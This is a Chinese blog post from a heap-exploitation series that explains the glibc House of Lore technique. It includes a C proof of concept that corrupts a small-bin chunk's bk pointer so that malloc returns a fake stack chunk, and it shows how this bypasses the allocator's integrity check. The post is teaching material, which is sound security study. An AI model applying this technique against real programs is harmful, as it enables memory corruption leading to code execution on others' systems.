---
title: "heap利用 7/9: House of Lore"
date: 2023-02-05T15:36:08+08:00           

tags : [                                    
"heap利用",
]
categories : [                              
"heap利用",
]
keywords : [                                
"heap利用",
]
---


这种攻击基本上是针对small bins和large bins伪造chunk。然而，由于在2007年左右增强了对large bins的保护(引入了`fd_nextsize`和`bk_nextsize`)，这种攻击几乎没有什么效果了。所以在这里我们只说明了对small bins的攻击。首先，将一个小的chunk放在small bin中，覆盖它的`bk`指针以指向一个小的fake chunk。需要注意的是，对于small bin链表，chunk在链表头部进行插入，从尾部开始取出。先通过一个`malloc`调用将一个真实的chunk从bin链表中删除，使得攻击者构造的fake chunk进入链表的尾部，从而实现下一个`malloc`调用会返回fake chunk的目的。


考虑下面的示例代码[[完整代码](https://github.com/DhavalKapil/heap-exploitation/blob/d778318b6a14edad18b20421f5a06fa1a6e6920e/assets/files/house_of_lore.c)]:
```c
struct small_chunk {
  size_t prev_size;
  size_t size;
  struct small_chunk *fd;
  struct small_chunk *bk;
  char buf[0x64];               // chunk falls in smallbin size range
};

struct small_chunk fake_chunk;                  // At address 0x7ffdeb37d050
struct small_chunk another_fake_chunk;
struct small_chunk *real_chunk;
unsigned long long *ptr, *victim;
int len;

len = sizeof(struct small_chunk);

// Grab two small chunk and free the first one
// This chunk will go into unsorted bin
ptr = malloc(len);                              // points to address 0x1a44010

// The second malloc can be of random size. We just want that
// the first chunk does not merge with the top chunk on freeing
malloc(len);                                    // points to address 0x1a440a0

// This chunk will end up in unsorted bin
free(ptr);

real_chunk = (struct small_chunk *)(ptr - 2);   // points to address 0x1a44000

// Grab another chunk with greater size so as to prevent getting back
// the same one. Also, the previous chunk will now go from unsorted to
// small bin
malloc(len + 0x10);                             // points to address 0x1a44130

// Make the real small chunk's bk pointer point to &fake_chunk
// This will insert the fake chunk in the smallbin
real_chunk->bk = &fake_chunk;
// and fake_chunk's fd point to the small chunk
// This will ensure that 'victim->bk->fd == victim' for the real chunk
fake_chunk.fd = real_chunk;

// We also need this 'victim->bk->fd == victim' test to pass for fake chunk
fake_chunk.bk = &another_fake_chunk;
another_fake_chunk.fd = &fake_chunk;

// Remove the real chunk by a standard call to malloc
malloc(len);                                    // points at address 0x1a44010

// Next malloc for that size will return the fake chunk
victim = malloc(len);                           // points at address 0x7ffdeb37d060
```

因为对小chunk的处理比较复杂，所以伪造小chunk需要更多的步骤。需要特别注意的是，为了绕过使用`malloc`返回小chunk的安全检查"malloc () : smallbin double linked list corrupted"，必须确保`victim->bk->fd`等于`victim`。此外，在两者之间添加了额外的"malloc"调用，以确保:
1. 第一个chunk进入unsorted bin，而不是在free时与top chunk合并。
2. 第一个chunk之后会由unsorted bin进入small bin链表，因为它不满足大小为`len + 0x10`的malloc请求。
  
相应unsorted bin和samll bin的链表状态变化如下所示。
1. free(ptr)操作后，ptr进入unsorted bin链表中。
>unsorted bin链表：head<->ptr<->tail

>small bin链表：head<->tail
2. malloc(len+0x10)操作后，ptr进入small bin链表中。
>unsorted bin链表：head<->tail

>head<->ptr<->tail
3. 修改指针操作后，fake_chunk插入small bin链表中。
>unsorted bin链表：head<->tail

>small bin链表：undefined<->fake_chunk<->ptr<->tail
4. malloc(len)后，ptr从small bin链表中取出。
>unsorted bin链表：head<->tail

>small bin链表：undefined<->fake_chunk<->tail
5. malloc(len)后，返回fake_chunk。
>unsorted bin链表：head<->tail

>small bin链表：undefined<->tail
 
注意：对相应的samll bin的另一个'malloc'调用将导致内存区段错误。